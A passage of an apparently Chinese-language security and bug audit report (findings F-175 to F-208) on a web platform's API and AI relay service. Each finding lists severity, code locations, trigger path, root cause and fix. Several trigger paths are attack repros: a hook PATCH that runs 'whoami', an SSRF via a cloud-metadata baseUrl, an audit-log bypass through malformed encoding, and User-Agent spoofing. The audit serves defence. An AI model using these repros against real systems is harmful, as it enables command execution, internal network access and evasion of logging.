### F-175 技能同步 upsert 无唯一约束，并发 push 产生同 `(author_id, slug)` 重复行
- **严重度**：P2
- **文件与行号**：`apps/api/src/db/skills-queries.ts:177-240`；`routes/user/skills-routes.ts:50-87,112-138`；`packages/database/src/schema/skills.ts:21-41`
- **触发路径**：同一用户两台设备同时 `POST /api/skills/push` 或 `POST /api/skills/db-sync` 同一 slug。
- **根因**：`upsertSkillBySlug` 是 check-then-write，`(author_id, slug)` 无唯一约束。
- **证据**：`skills-queries.ts:177-240` 先 `findSkillByAuthorAndSlug` 再 UPDATE/INSERT（无 onConflict）。
- **影响**：重复行；`limit(1)` 命中任意行导致长期读写漂移；删除语义错乱。
- **建议修法**：补唯一索引（先清存量）+ `onConflictDoUpdate`。
- **是否当场可修**：否（需迁移+清数据）。

### F-176 圈子帖 / 问答详情按 id 直查未过滤 `status=1`，已下架内容仍可读
- **严重度**：P2
- **文件与行号**：`apps/api/src/db/community-queries.ts:153-156,294-319`；`routes/community/circles.ts:568-578`、`asks.ts:131-141`
- **触发路径**：`GET /api/community/circles/posts/:id`、`GET /api/community/asks/:id`，目标已下架（status=0）。
- **根因**：列表查询均带 `status=1`，详情函数只按 id。
- **证据**：`community-queries.ts:153-156` `select().from(circlePosts).where(eq(id)).limit(1)`。
- **影响**：违规内容下架形同虚设。
- **建议修法**：详情加 `status=1`（管理端另用不过滤函数）。
- **是否当场可修**：是。

### F-177 资讯推荐/排行批量取文章只过滤 `isPublished`，漏 `status`（下架仍被推荐）
- **严重度**：P3
- **文件与行号**：`apps/api/src/db/news-queries.ts:250-257`（对照 `:89`）；`routes/news.ts:204,212,238,420`
- **触发路径**：访问资讯首页排行/推荐/相关推荐，其 newsId 指向已 `status=0` 的文章。
- **根因**：`findArticlesByIds` 只加 `eq(isPublished,true)`，漏 `status=1`。
- **证据**：`:250-257` `.where(and(inArray(id, ids), eq(isPublished,true)))`。
- **影响**：已下架文章仍出现在推荐位且带正文。
- **建议修法**：统一加 `eq(status,1)` 或抽公共条件常量。
- **是否当场可修**：是。

### 第七轮 D：relay 池 / 短信 / 转码

### F-178 渠道配额「检查已接线、用量从不写入」，日/月配额永不生效
- **严重度**：P1
- **文件与行号**：`apps/api/src/services/channel-quota-service.ts:433,485`（`recordUsage/recordUsageBatch`）；`services/relay-channel-router.ts:39,753`（仅 import `checkQuota`）；`jobs/ops-retention-cleanup.ts:26`（仅 `resetDailyQuota`）
- **触发路径**：任意 `/v1/chat/completions` relay 调用 → `selectChannelCandidates` → `checkQuota(keyPoolId)`。
- **根因**：`checkQuota` 读 `ai_relay_channel_daily_usage`，但唯一写入函数 `recordUsage/recordUsageBatch` 在 `apps/api/src` 内零调用方；聚合恒为 0，`allowed` 恒 true。
- **证据**：全仓仅 4 处 import `channel-quota-service`，均不引 `recordUsage`；`getRawDailyUsage/getRawMonthlyUsage` 恒 0。
- **影响**：`daily/monthly_call_limit`、`token_limit` 全部失效，成本控制与防刷形同虚设。
- **建议修法**：转发层每次调用后 `recordUsage(tokens,costCents,isError)`；`recordUsageBatch` 需先按 keyPoolId 聚合再 upsert（否则 ON CONFLICT 同行二次更新报错）。
- **是否当场可修**：是。

### F-179 单个 Key 密文解密失败未被隔离，整条模型渠道路由直接失败
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-channel-router.ts:688-704,251-255`；`relay-upstream-forwarder.ts:240-260`
- **触发路径**：relay 请求 → `selectChannelCandidates` 遍历可用 Key → 某条 `api_key_enc` 损坏/密钥轮换 → `pushCandidate` 抛错 → 整批候选失败。
- **根因**：`pushCandidate` 内直接 `decryptApiKey(keyData.apiKeyEnc)`，无 try/catch；账号池侧对坏凭据逐账号 try/catch 跳过，渠道池没有等价隔离。
- **证据**：`:696` `apiKey: decryptApiKey(keyData.apiKeyEnc)`；`relay-upstream-forwarder.ts:247-259` catch 后 `return null`（回退 ai-service）。
- **影响**：一条坏密文使该模型下所有渠道 Key 不可用，全部回退，日志仅 `channel_query_error` 易误判。
- **建议修法**：`pushCandidate` 内单独 try/catch，失败 warn+计数并跳过该 Key。
- **是否当场可修**：是。

### F-180 响应缓存键只喂 4 个维度，`response_format/seed/top_p` 不同仍命中同一缓存
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-public.ts:1772-1777,2142-2145`；`services/relay-response-cache.ts:212-227`；上游 `v1-public.ts:1721,1893,1907-1908`
- **触发路径**：`POST /v1/chat/completions`（非流式、无 tools）命中缓存分支。
- **根因**：`computeCacheKey` 只传 `model/messages/temperature/max_tokens`，且用原始 `messages` 而非注入 json_schema 提示的 `upstreamMessages`；声明支持的其他 6 维未传。
- **证据**：`:1772-1777` 四字段调用；`:212-224` 签名支持 top_p/seed/response_format/tools 等。
- **影响**：JSON 结果与纯文本请求互相复用、seed 失效、缓存统计失真。
- **建议修法**：改用真正发给上游的 body 同源字段计算缓存键。
- **是否当场可修**：是。

### F-181 缓存命中只把「钱」置 0，token 余额/订阅窗口仍按缓存用量扣
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-public.ts:1784-1804`；`services/relay-billing-service.ts:1084-1100,1257,1340,1909-1916`
- **触发路径**：同一请求第二次下发 → 缓存 HIT → `recordCall({totalTokens: cached.usage.total_tokens, preDeducted})`。
- **根因**：命中时仅 `costCentsToDeduct=0`，`input.totalTokens` 仍为真实 usage；`settlePreDeduction(pre, input.totalTokens, ...)` 与订阅窗口继续按缓存用量扣。
- **证据**：`:1097-1100` 仅置 cost 为 0；`:1257` 仍传 `input.totalTokens`。
- **影响**：用户命中缓存仍被扣 token 配额，缓存收益被抵消（若产品口径为「仍计 token」则应改判非缺陷，需确认）。
- **建议修法**：命中缓存时结算 token 也置 0（统计另列 `cacheSavedTokens`）。
- **是否当场可修**：是（需产品确认口径）。

### F-182 短信退订回执写入失败被吞且仍回 200，退订永久丢失
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/sms-callback.ts:140-152,160`；`services/sms-compliance.ts:89-125,141-164`
- **触发路径**：腾讯短信「回复」回调 → `kind==='reply'` → 回复「TD」→ `addSmsUnsubscribe` DB 失败。
- **根因**：`ok` 只用于计数不分支，回调恒 200；`addSmsUnsubscribe` 失败 `return false`。
- **证据**：`:145-152` `if (ok) unsubscribeCount += 1`；`:160` 无条件 `status(200).send({result:0})`。
- **影响**：黑名单未落库且平台不再重试，用户仍收营销短信，合规/投诉风险。
- **建议修法**：退订失败回 5xx 触发重试。
- **是否当场可修**：是。

### F-183 熔断计数器 Redis 读改写非原子，并发下连续失败计数丢失、熔断难触发
- **严重度**：P2
- **文件与行号**：`apps/api/src/services/relay-channel-router.ts:199-223,334,341,353`；调用方 `relay-upstream-forwarder.ts:382,386,399`
- **触发路径**：每次上游调用结束 `recordChannelResult(keyPoolId, success, latency)` → `hgetall` → 内存改 → `hset`。
- **根因**：无 WATCH/MULTI/Lua/HINCRBY，并发失败读同一值覆盖。
- **证据**：`:334` `const state = await readCircuitState(...)`；`:353` `await writeCircuitState(...)`。
- **影响**：坏上游持续 5xx 时计数到不了阈值，熔断迟迟不打开；成功请求也可能覆盖并发失败计数。
- **建议修法**：`HINCRBY` + Lua 判阈值，或 WATCH/MULTI 重试。
- **是否当场可修**：是。

### 第七轮 E：MCP / OpenClaw / API Key 分享 / BYOK

### F-184 Hook PATCH 绕过「script 仅管理员」闸，任意登录用户可拿到服务账号命令执行
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/hooks.ts:130-139,401-417`；`apps/ai-service/app/routers/hooks.py:202-207,316-318,153-160,42-44`；`app/services/hook_engine.py:1217-1236`
- **触发路径**：`POST /api/hooks` 建 `log` 动作 Hook → `PATCH /api/hooks/{id} {"action":{"type":"script","config":{"command":"whoami"}}}` → `POST /api/hooks/{id}/test`。
- **根因**：创建链路 `:206` 拒绝非管理员 script，更新链路只 `_validate_action`（白名单），无 `_is_admin`；执行侧同样只复核白名单，白名单开启即绕过。
- **证据**：`hooks.py:316-318` 无 admin 判断；`hook_engine.py:1217-1236` `cmd /c` / `sh -c`。
- **影响**：普通用户可在 ai-service 宿主机执行任意命令（前提：`HOOK_ALLOWED_ACTIONS` 非空）。
- **建议修法**：`update_hook` 中 `script` 动作补 `_is_admin` 校验（与 instantiate 对齐）。
- **是否当场可修**：是。

### F-185 分享 API Key 的 `maxTotalTokens` 与 `sharedWithUserId` 是死字段，从未执行
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/api-key-shares.ts:28,38,84-93`；`services/api-key-share-service.ts:90,95,191-200`；`plugins/api-key-auth.ts:776-905`
- **触发路径**：用户 A 分享并设 `maxTotalTokens:1000`/`sharedWithUserId:B` → 任何持 `share_...` token 者调用 `/v1/chat/completions`，只受源 Key 额度限制。
- **根因**：`incrementUsage` 全仓零调用，`usedTotalTokens` 恒 0；`authenticateShareToken` 不读这两个字段。
- **证据**：`api-key-share-service.ts:191` 仅定义；`api-key-auth.ts:825-869` 无总额度/受众分支。
- **影响**：分享限额/限人形同虚设，token 泄漏无法靠额度止损。
- **建议修法**：响应 usage 后 `incrementUsage`；鉴权前置总额度条件 UPDATE；受众字段要么删除要么改为双因子。
- **是否当场可修**：部分可。

### F-186 BYOK「连通性测试」丢弃用户 `apiKey/baseUrl`，改用系统身份打平台 Key
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user-llm-configs.ts:490-517,107-122`；`user-llm-configs-v2.ts:208-224`；`utils/ai-service-fetch.ts:144-154`；`apps/ai-service/app/routers/llm.py:3379-3396,3556,3666-3667`；`core/llm_gateway.py:1566-1576`
- **触发路径**：用户填错 Key 点「测试连通」→ `POST /api/llm-configs/preview-test` → API 用 `system-worker` 身份 → ai-service 按 `system_owner_uuid` 选平台 provider → 返回「连通成功」。
- **根因**：`metadata.configId/testOnly` 只是透传，ai-service 全仓不读；`user-llm-configs.ts:501` 解构漏 `apiKey`，`baseUrl` 算出未用。
- **证据**：`:501` `const { templateCode, modelId, baseUrlOverride } = parsed.data`；`:503` baseUrl 未消费；`llm.py` 按 system owner 选行。
- **影响**：错误 Key 也显示成功；每次测试消耗平台 Key；`testOnly` 未生效且不计费；可指定受限 modelId。
- **建议修法**：测试链路改直连校验（复用 `llm-verify-key`），或 ai-service 增加按 configId + owner 的受控端点；至少 `max_tokens=1` 并记账。
- **是否当场可修**：是（中等改造）。

### F-187 用户自定义 `baseUrl` 在 v1/v2 均无 SSRF 校验，原样成为 ai-service 的 `api_base`
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user-llm-configs.ts:41,52,312-323,362`；`user-llm-configs-v2.ts:102,115,534-535,588`；`apps/ai-service/app/core/llm_gateway.py:2636-2637,3676-3681,2663`
- **触发路径**：创建 provider 填 `baseUrlOverride=http://169.254.169.254/...` → 正常发消息 → `litellm.acompletion(api_base=...)`。
- **根因**：仅 `z.url()`，保存/调用路径无 `ssrf-guard`；ai-service `api_base` 无任何私网/回环/元数据检查（同仓 `llm-verify-key.ts:187-233` 已做对）。
- **证据**：`user-llm-configs-v2.ts:102` `baseUrlOverride: z.url().max(500).optional()`；`llm_gateway.py:2636-2637` `call_kwargs["api_base"] = api_base`。
- **影响**：服务端 SSRF（内网/云元数据/本机端口探测）；带的是用户自己的 Key，不构成平台密钥外泄。
- **建议修法**：v1/v2 create/update 统一走 `ssrf-guard`；ai-service 调用前二次校验（防 DNS rebinding）。
- **是否当场可修**：是。

### F-188 `skills:<userId>` 同一 Redis key 既当 String 又当 Hash，安装市场技能后用户技能库读取报 WRONGTYPE 变空
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/skills.ts:69-96,796-803,807`
- **触发路径**：`POST /api/skills/:name/install` → `hset('skills:<uid>',...)` → 之后 `GET /api/skills` → `redis.get` 返回 WRONGTYPE → catch 后回退空 `skillsFallback`。
- **根因**：键空间冲突（同一 key 既写 String 又写 Hash）；反向 `hset` 失败被 catch 吞掉仍返回 `installed:true`。
- **证据**：`:78/92` `redis.get/set`；`:800` `server.redis.hset(...)`。
- **影响**：安装即消失；`POST /skills` 的 set 覆盖已安装 Hash，静默数据丢失。
- **建议修法**：统一为 JSON 数组或统一 Hash，不要混用。
- **是否当场可修**：是。

### F-189 LLM 分组重命名不回写 `provider_group`，删除守卫失效并产生孤儿 provider
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/user-llm-configs-v2.ts:1038-1040,1068-1077,1114-1126,553-554`
- **触发路径**：建组 A → provider 归属 A → `PUT /llm-groups/{id} {"label":"B"}` → `DELETE /llm-groups/{id}`：计数查 `provider_group='B'` 得 0 → 删除成功但 provider 仍带 A。
- **根因**：分组关系为字符串冗余，重命名只改组表 `group_label`，未级联 `provider_group/group_code`。
- **证据**：`:1068-1077` 只更新组表；`:1114-1126` 删除前按新 label 计数。
- **影响**：provider 从组视图消失，组删除后指向不存在组。
- **建议修法**：重命名同事务级联更新 provider 行；长期改 `group_id` 外键。
- **是否当场可修**：是。

## 十二、第八轮新增（chat-v1 / files-oss-live / chat-workspace 服务 / plugins / miniapp-edu）

> 本轮 5 路并行，共 25 条。已复核关键 P0：`point-aspect.ts:87-93` 按 2xx 状态码发分，`social.ts:240` 关注幂等恒 201。

### 第八轮 A：chat / v1 协议

### F-190 `/v1/fine_tuning/jobs` 全链路无租户隔离、用平台 Key 训练、任务缓存键全局共享

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/v1-protocol-completeness.ts:229-240,466-490,918-921,982-1039,1042-1103,1105-1173,1175-1225`；`apps/api/src/plugins/api-key-auth.ts`（认证产出 `request.apiKeyId`）
- **触发路径**：任意持有效 API Key 的用户 `POST /v1/fine_tuning/jobs {"model":"...","training_file":"..."}` → `GET /v1/fine_tuning/jobs`（无 owner 过滤）→ 可 `GET /v1/fine_tuning/jobs/{jobId}` 与 `POST .../cancel` 他人任务。
- **根因**：任务记录不落 `ownerUserId/apiKeyId`；列表/详情/取消只按 `jobId`；训练上游调用用平台 system token（`:918-921`），费用与配额不归属调用者；Redis 键 `ft:job:{jobId}` 无租户前缀，跨租户可撞。
- **证据**：`:982-1039` 创建后仅 `redis.set(\`ft:job:${jobId}\`, ...)`；`:1042-1103` 列表 `Object` 遍历；全文件无 `request.apiKeyId|userId` 过滤。
- **影响面**：跨租户读取/取消他人微调任务；平台 Key 被白用产生训练费用。
- **建议修法**：任务表增 `owner` 列与 Redis 前缀；列表/详情/取消加属主条件；上游调用改按调用者计费。
- **是否当场可修**：否（需表结构 + 迁移）。

### F-191 `/v1/embeddings`、`/v1/chat/vision|moa`、`/v1/agents/*` 系统 token 直连，零计费零配额

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/v1-ai-core.ts:73-74,370,383-387,396-421`；`apps/api/src/utils/ai-service-fetch.ts:149`
- **触发路径**：登录用户 `POST /v1/embeddings`、`POST /v1/chat/vision`、`POST /v1/chat/moa`、`POST /v1/agents/{id}/...`。
- **根因**：这些端点用 `aiServiceSystemFetch(...)`（system-worker 身份 + 平台 provider），响应 usage 仅回填给客户端，无 `recordCall/preDeduct/checkQuota`；全文件 `recordCall|checkQuota|preDeduct` 0 命中。
- **证据**：`:73-74` `import { aiServiceSystemFetch }`；`:396-421` 直接转发并 `return reply.send(upstream)`；`ai-service-fetch.ts:149` 注入系统票据。
- **影响面**：约 20 个端点对平台 Key 免费开放，无预算/组织 allowlist 治理，可被刷用量。
- **建议修法**：统一接 relay 计费钩子（或至少在 cch 侧按 usage 记账/扣配额）。
- **是否当场可修**：否（需计费接线，中等改造）。

### F-192 `/api/chat/multi/multi` 的 `vendors` 无数量上限，单请求可放大为数百次上游调用

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/chat-models.ts:398-402,313-372,850-899`（核心 `:857-863,869-882`）
- **触发路径**：`POST /api/chat/multi/multi {"vendors":"a,b,c,...（数千个）","messages":[...]}`。
- **根因**：`vendors: z.string().min(1)` 无 `.max()`/条数限制，`split(',')` 后 `for` 循环逐个以平台 Key 发起上游请求，无并发/总数上限。
- **证据**：`:398-402` schema 仅 `min(1)`；`:857-863` `const list = vendors.split(',').map(s=>s.trim())`；`:869-882` 逐项 `await` 调用。
- **影响面**：单请求放大为 N 次计费上游调用，成本放大与上游限流/封号风险；亦可用于探测内网模型。
- **建议修法**：`vendors` 改 `z.array(z.enum([...])).max(N)`；总并发上限；按用户速率限制。
- **是否当场可修**：是。

### F-193 `/v1/threads/:threadId/runs` 把开发者 API Key 当 Bearer 转发给 ai-service，请求恒定 401/502

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-assistants.ts:1121,1207-1226,1299-1322`；`apps/api/src/utils/ai-service-fetch.ts:86-98`；`apps/ai-service/app/core/jwt_auth.py:195-206`；`apps/ai-service/app/core/config.py:147-162`
- **触发路径**：`POST /v1/threads/{threadId}/runs`（Assistants 协议）→ 内部 `aiServiceFetch(request, '/api/llm/complete', ...)` 以调用方 `Authorization: Bearer ihui_...` 透传。
- **根因**：`aiServiceFetch` 在 `authHeader` 缺省时复用入站 `Authorization`；ai-service 只接受 JWT（`jwt_auth.py:195-206`），API Key 必然校验失败 → 401，远端 5xx 则 502。
- **证据**：`:1207-1211` 传 `request` 未覆盖 header；`ai-service-fetch.ts:86-98` `headers.authorization ??= request.headers.authorization`。
- **影响面**：Assistants 运行链路恒不可用（功能级不可用，非安全）。
- **建议修法**：改用 `aiServiceSystemFetch` 或显式注入服务票据。
- **是否当场可修**：是。

### F-194 模型映射后计费口径不一致：预扣/缓存按 `resolvedModel`，成功结算按原始 `model`

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-public.ts:1628-1649,1691-1699,1784-1796,2114-2135,2155-2172`；`apps/api/src/services/relay-billing-service.ts:1118,1340-1341`
- **触发路径**：请求 `model="gpt-4o"`（被映射到 `gpt-4o-mini` 或自定义别名）→ 预扣按映射后价、成功结算按原价。
- **根因**：`preDeductQuota(resolvedModel)` 与 `recordCall({model})` 使用不同变量；缓存键也用 `resolvedModel`。
- **证据**：`:1695` 预扣传 `resolvedModel`；`:1787` 结算结构里 `model` 为原始；`:2117` 缓存键 `resolvedModel`。
- **影响面**：同一次调用三种价，用户被多扣/少扣；对账与账单解释不一致。
- **建议修法**：全链路统一使用一个 `billingModel`（以实际调用上游的模型为准）。
- **是否当场可修**：是。

### 第八轮 B：files / oss / live / transcode

### F-195 SRS 服务器列表把 `apiSecret` 原样返回给任意登录用户

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/srs.ts:185-190`；`packages/database/src/schema/srs.ts:76`；`apps/api/src/services/srs-service.ts:120-123`
- **触发路径**：任意登录用户 `GET /api/srs/servers`。
- **根因**：`db.select().from(srsServers)` 返回整行，包含 `api_secret`（SRS HTTP API 管理密钥）；无字段白名单、无管理员判定。
- **证据**：`:185-190` 直接 `select()` 后 `success(rows)`；schema `:76` `apiSecret`。
- **影响面**：泄露后可直连 SRS HTTP API 踢流/改配置/拉全部流信息，构成直播面接管。
- **建议修法**：显式 `select({...})` 排除敏感列；查询端点加 `requireAdmin`。
- **是否当场可修**：是。

### F-196 任意登录用户可枚举全部推流地址与 `streamKey`，可盗播/顶替推流

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/srs.ts:75-91,93-104,173-181`；`packages/database/src/schema/srs.ts:26`；`apps/api/src/services/srs-service.ts:42`
- **触发路径**：`GET /api/srs/streams`（或按 id 详情）返回全站 `streamKey`、`pushUrl`、`playUrl`。
- **根因**：查询无 `userId/ownerId` 过滤；`streamKey` 是推流凭据。
- **证据**：`:75-91` 列表直接返回行含 `streamKey/pushUrl`；`:93-104` 详情按 id 无属主。
- **影响面**：可冒用他人 `streamKey` 推流（内容劫持）、盗播付费流。
- **建议修法**：列表/详情加属主过滤；对他人仅返回脱敏字段。
- **是否当场可修**：是。

### F-197 `/api/oss/resource/file` 返回不存在的分片上传地址，且绕过 chunked-upload 的初始化闸门

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/other/oss-resource-routes.ts:30-63`（`:57`）；`apps/api/src/routes/chunked-upload.ts:234,151-190`
- **触发路径**：客户端按 `POST /api/oss/resource/file` 返回的 `uploadUrl` 调 `/api/chunked-upload/chunk` → 404；且该路径未走 `init` 的配额/类型/大小校验。
- **根因**：返回字符串 `/api/chunked-upload/chunk`，实际注册为 `/api/chunked-upload/upload`；此端点自行拼装上传会话，跳过 `chunked-upload.ts:151-190` 的初始化校验。
- **证据**：`oss-resource-routes.ts:57` `uploadUrl: '/api/chunked-upload/chunk'`；`chunked-upload.ts:234` `server.post('/chunked-upload/upload', ...)`。
- **影响面**：该上传入口功能不可用；若前端改写路径直连 upload，则绕过配额/类型/大小校验。
- **建议修法**：修正 URL；统一走 init（或复用 `createUploadSession`）。
- **是否当场可修**：是。

### F-198 转码队列 FIFO 淘汰只删 Map 与输出目录，不杀子进程，产生孤儿 ffmpeg 与磁盘泄漏

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/transcode-service.ts:150-170,192-196,243-244`
- **触发路径**：并发转码任务超过上限 → 最旧任务被 `jobs.delete` + `childProcesses.delete` + `rm(outputDir)`，但 `child.kill()` 未调用。
- **根因**：淘汰逻辑缺 `child.kill('SIGKILL')`；`rm` 时进程仍在写该目录。
- **证据**：`:161-168` 三行删除与 `rm`；`:243-244` 仅记录句柄，未在淘汰侧 kill。
- **影响面**：孤儿 ffmpeg 持续占用 CPU/磁盘；`rm` 与写并发导致目录残留；长期耗尽。
- **建议修法**：淘汰前先 `kill` 并等待退出，再删目录；对超时任务同样 kill。
- **是否当场可修**：是。

### F-199 `GET /api/live-gifts/records` 无鉴权，匿名可分页读取全站所有打赏流水

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/live-gifts.ts:329-351,73`；`packages/database/src/schema/live-extended.ts:106-122`
- **触发路径**：未登录 `GET /api/live-gifts/records?page=1&pageSize=100`。
- **根因**：路由未挂 `authenticate/checkAuth`，查询无条件（无 `userId/roomId`），直接分页返回。
- **证据**：`:329-351` 无 preHandler；`:73` 查询 `select().from(liveGiftRecords).limit().offset()`。
- **影响面**：全站用户打赏金额、对象、时间、userId 匿名泄露（财务隐私）。
- **建议修法**：加认证；按 `senderId/receiverId/roomId` 过滤；管理端另设接口。
- **是否当场可修**：是。

### 第八轮 C：chat / workspace 服务

### F-200 Crew 所有 LLM 步骤全部失败仍记 `completed` 且返回 `success:true`

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/crew-orchestrator.ts:206-218,615-637`；`apps/api/src/routes/crew.ts:189-206`
- **触发路径**：Crew 执行中上游全 5xx/超时 → 每步产出错误文本 → 编排结束调用 `updateTaskStatus(taskId,'completed')` 并 `success:true`。
- **根因**：仅判断结果对象是否为真值（错误文本是 truthy 字符串），不区分 `ok/error`；任务终态未按失败分支写 `failed`。
- **证据**：`:615-637` 汇总后无条件 `updateTaskStatus(...,'completed')`；`:206-218` 返回值 `success:true`。
- **影响面**：失败任务被计为成功，重试/告警/对账全部失效；用户拿到错误内容却显示已完成。
- **建议修法**：按步骤 `ok` 比例判定终态；全失败写 `failed` 并返回 `success:false`。
- **是否当场可修**：是。

### F-201 工作区锁抢到后状态落库失败不释放，心跳永久续期形成死锁

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/agents-kanban.ts:477,493,509,557-563`；`apps/api/src/services/workspace-lock-heartbeat.ts:106-111`；`apps/api/src/services/workspace-lock.ts:204`
- **触发路径**：`agents-kanban` 抢锁成功 → 随后 DB 写失败/抛错 → 未走 `finally releaseLock` → 心跳每周期 `expire` 续期。
- **根因**：acquire 后的业务写不在 try/finally 内；心跳只看锁是否存在不看持有者存活；`releaseLock` 只在成功路径调用。
- **证据**：`:477` acquire；`:557-563` 写库，无 finally；`workspace-lock-heartbeat.ts:106-111` 无条件续期。
- **影响面**：该工作区永久被“幽灵锁”占用，其他实例/用户无法操作。
- **建议修法**：acquire 后整体 try/finally 释放；心跳增加 holder 存活/最新心跳时间判断；锁值含 token 防误删。
- **是否当场可修**：是。

### F-202 Subagent 取消只改内存，任务完成后又被覆写为 `completed`

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/subagent-dispatch-service.ts:2700,2705-2722,2792-2799,3251-3269`；`apps/api/src/routes/subagent-dispatch.ts:705-722`
- **触发路径**：`POST /api/subagent-dispatch/{id}/cancel` → 仅置内存标志 → 子代理自然跑完 → 完成回写 `completed`。
- **根因**：取消未持久化终止态，也未阻断完成回写；完成路径不检查 `cancelled` 标志。
- **证据**：`:3251-3269` 仅设 `state.cancelled=true`；`:2792-2799` 完成时无条件写 `completed`。
- **影响面**：用户以为已取消，实际继续消耗 token 并占用资源；状态与实际不符。
- **建议修法**：取消写持久化终态并在完成回写前判 `cancelled`；必要时中止底层调用。
- **是否当场可修**：是。

### F-203 Crew `llm_generate` 工具的子 LLM 用量只记成本不扣余额

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/crew-tools.ts:167-177`；`apps/api/src/services/crew-llm-adapter.ts:173-189`；`apps/api/src/plugins/ai-cost.ts:503-527`；`apps/api/src/services/crew-orchestrator.ts:486,517-555,565,583`；`apps/api/src/routes/crew.ts:191-198,261-272`
- **触发路径**：Crew 任务中模型调用 `llm_generate` 工具 → 适配器直接调上游 → 只 `recordAiCost` 记统计，无 `preDeduct/settle`。
- **根因**：工具子调用绕过了计费中间件（走内部 adapter），成本仅进统计表，不进用户余额/配额。
- **证据**：`crew-tools.ts:167-177` 调 `crew-llm-adapter`；`ai-cost.ts:503-527` 只落 cost 记录；全链无 `preDeductQuota`。
- **影响面**：Crew 场景下工具型子调用免费，成本由平台承担，可被构造刷量。
- **建议修法**：adapter 内复用 relay 计费（按 userId 预扣+结算）。
- **是否当场可修**：否（需接线，中等改造）。

### F-204 Redis 故障时工作区锁静默降级为进程内锁，无 TTL、无跨实例互斥

- **严重度**：P2
- **文件与行号**：`apps/api/src/services/workspace-lock.ts:139-159,206-213,217-225`；`apps/api/src/routes/agents-kanban.ts:477`；`apps/api/src/routes/admin-extended/agent-task-routes.ts:93`
- **触发路径**：Redis 连接异常 → `acquireLock` catch 后回退 `Map` 内存锁 → 多实例同时进入临界区；进程崩溃后内存锁永不清理。
- **根因**：降级路径无日志告警、无 TTL、无跨实例；调用方无从感知。
- **证据**：`:206-213` `catch { return acquireLocal(...) }`；`:139-159` 纯内存 Map；`:217-225` 释放只删本进程。
- **影响面**：Redis 抖动期间并发写冲突（丢更新/重复执行）；崩溃后锁泄漏。
- **建议修法**：降级必须告警并可配置为 fail-fast；内存锁加 TTL 与 owner 校验。
- **是否当场可修**：是。

### 第八轮 D：plugins

### F-205 关注接口幂等恒返回 201，`point-aspect` 按状态码发分，导致无限刷积分

- **严重度**：P0
- **文件与行号**：`apps/api/src/plugins/point-aspect.ts:24-25,71,87-93`；`apps/api/src/routes/social.ts:145-147,197,240`；`apps/api/src/db/social-queries.ts:37`；`apps/api/src/db/point-queries.ts:433-442`
- **触发路径**：用户反复 `POST /api/social/follow/{userId}`（已关注后再调）→ 路由恒 `reply.code(201)` → aspect 在 `onResponse` 见到 201 即加积分。
- **根因**：幂等分支（已关注）仍返回 201 而非 200/204；积分发放以 HTTP 状态码为唯一判据，未判「本次是否真正新增关注」。
- **证据**：`social.ts:240` 无条件 `code(201)`；`point-aspect.ts:87-93` `if (statusCode >= 200 && statusCode < 300) addPoints(...)`；`social-queries.ts:37` 已存在时仍走插入/忽略。
- **影响面**：任意登录用户循环关注/取关即可无限刷积分，积分可兑换实物/权益，形成资损。
- **建议修法**：幂等分支返回 200 并让 aspect 以显式 `didCreate` 标志发分；`addPoints` 加 `(userId,eventId)` 幂等键。
- **是否当场可修**：是。

### F-206 `watch-aspect` 根级 preHandler 早于鉴权执行，浏览量双计且观看行为从不落库

- **严重度**：P1
- **文件与行号**：`apps/api/src/plugins/watch-aspect.ts:56,62-64,78,80-85`；`apps/api/src/routes/resource.ts:313`；`apps/api/src/db/resource-queries.ts:148-151`；`apps/api/src/routes/news.ts:386`；`apps/api/src/plugins/principal.ts:18-20`；`apps/api/src/plugins/auth.ts:294`
- **触发路径**：`GET /api/resource/{id}` 或新闻详情 → 根级 preHandler 先跑（`request.userId` 仍 undefined）→ 计一次浏览 → 路由级鉴权后 handler 再计一次 → 两次 `incrementViewCount`。
- **根因**：钩子注册在根实例且自述早于路由级 preHandler；钩子内以 `request.userId` 判断是否记录观看，此时恒 undefined 而跳过 insert。
- **证据**：`principal.ts:18-20` 注释「root preHandler 早于路由 preHandler」；`watch-aspect.ts:78` `if (!request.userId) return`（永远 return）；`resource-queries.ts:148-151` 无条件 `+1`。
- **影响面**：浏览量虚高（翻倍）；观看记录表 0 写入，推荐/学习统计失真。
- **建议修法**：改为 `onResponse` 或路由级 hook 且读取已认证身份；浏览量按 request 去重。
- **是否当场可修**：是。

### F-207 审计日志解析畸形 percent-encoding 直接抛错，导致该请求审计行丢失

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/audit-logger.ts:192-205,202,317,357`；`apps/api/src/routes/audit.ts:88`
- **触发路径**：请求 URL/query 含非法 `%` 序列（如 `?q=%zz`）→ `decodeURIComponent` 抛 `URIError` → 审计写入中断。
- **根因**：解析未包裹 try/catch；审计作为旁路却能让主流程或自身写入失败。
- **证据**：`:202` `decodeURIComponent(raw)` 无保护；`:317` 写入路径未 catch 解析异常。
- **影响面**：攻击者可构造畸形 URL 使自身操作不被审计（审计绕过）。
- **建议修法**：`try { decode } catch { 用原始串 }`；审计失败走降级队列而非抛错。
- **是否当场可修**：是。

### F-208 连接数守卫的 UA 白名单客户端可伪造，绕过单 IP 连接上限

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/http-conn-guard.ts:29-37,110-112`
- **触发路径**：攻击者设置 `User-Agent` 为白名单内的客户端串 → 跳过连接槽计数。
